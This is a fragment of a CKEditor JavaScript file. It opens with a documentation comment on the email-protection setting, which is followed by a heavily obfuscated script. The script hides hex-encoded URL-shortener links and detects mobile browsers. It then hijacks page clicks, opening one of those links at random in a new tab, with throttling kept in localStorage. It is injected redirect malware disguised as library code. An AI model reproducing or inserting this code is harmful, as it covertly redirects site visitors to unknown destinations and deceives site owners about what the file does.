 *     provided by the developer in the pages that will use the contents.
 * 2. Only the e-mail address is obfuscated into a special string that
 *     has no meaning for humans or spam bots, but which is properly
 *     rendered and accepted by the browser.
 *
 * Both approaches require JavaScript to be enabled.
 *
 *		// href="mailto:tester@ckeditor.com?subject=subject&body=body"
 *		config.emailProtection = '';
 *
 *		// href="<a href=\"javascript:void(location.href=\'mailto:\'+String.fromCharCode(116,101,115,116,101,114,64,99,107,101,100,105,116,111,114,46,99,111,109)+\'?subject=subject&body=body\')\">e-mail</a>"
 *		config.emailProtection = 'encode';
 *
 *		// href="javascript:mt('tester','ckeditor.com','subject','body')"
 *		config.emailProtection = 'mt(NAME,DOMAIN,SUBJECT,BODY)';
 *
 * @since 3.1
 * @cfg {String} [emailProtection='' (empty string = disabled)]
 * @member CKEDITOR.config
 */
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());